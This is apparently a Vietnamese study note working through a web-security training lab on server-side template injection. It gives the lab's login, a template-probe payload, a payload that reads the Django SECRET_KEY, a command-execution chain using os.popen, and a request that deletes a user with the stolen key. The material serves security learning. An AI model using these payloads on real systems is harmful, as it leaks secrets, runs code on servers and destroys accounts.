![[ssti-objects.png]]
Lab đọc secret qua object rồi xóa user carlos.

> [!NOTE] phân tích đề
> - lab cho login sẵn `content-manager`, có chỗ edit template/product description. Sau khi quan sát gói tin này, mình thấy template render được cả object của dev chứ không chỉ string thường, nên mình nghĩ ngay tới `{{settings.SECRET_KEY}}`, fail thì mò object chain.
> - liên quan: [[lys thuyet SSTI]] , [[server side template injection]]

### hướng giải
- [ ] login `content-manager:C0nt3ntM4n4g3r`.
- [ ] tìm chỗ edit template.
- [ ] thử `{{7*7}}` để confirm SSTI.
- [ ] thử `{{settings.SECRET_KEY}}` để đọc secret.
- [ ] nếu blank thì thử `{% debug %}` hoặc `{{self.__init__...}}` để liệt kê object.
- [ ] lấy secret rồi xóa user carlos.

### giải
- mình confirm trước:
```http
POST /product/template HTTP/1.1
Host: xxx.web-security-academy.net

template=hello+{{7*7}}
```
- response:
```html
hello 49
```
- -> dính rồi.
- tiếp mình đọc secret:
```http
POST /product/template HTTP/1.1

template={{settings.SECRET_KEY}}
```
- response:
```html
django-insecure-abc123xyz...
```
- -> lụm được SECRET_KEY.
- nếu payload trên blank, mình thử chain này:
```
{{self.__init__.__globals__.os.popen('id').read()}}
```
- -> để dò object đang có.
- sau khi có secret, mình xóa carlos:
```http
POST /admin/delete-user HTTP/1.1

username=carlos&secret=django-insecure-abc123xyz...
```
- -> response `User deleted`.
- => lab solved.
- kết quả: đọc được key + user carlos biến mất.

> [!NOTE] bài học
> - object của dev hay lộ secret nhất.
> - nên mình luôn thử `settings.SECRET_KEY` đầu tiên với Django.
> - không RCE được thì vẫn còn đường đọc file.
> - tiếp: [[Lab-SSTI engine-specific]]
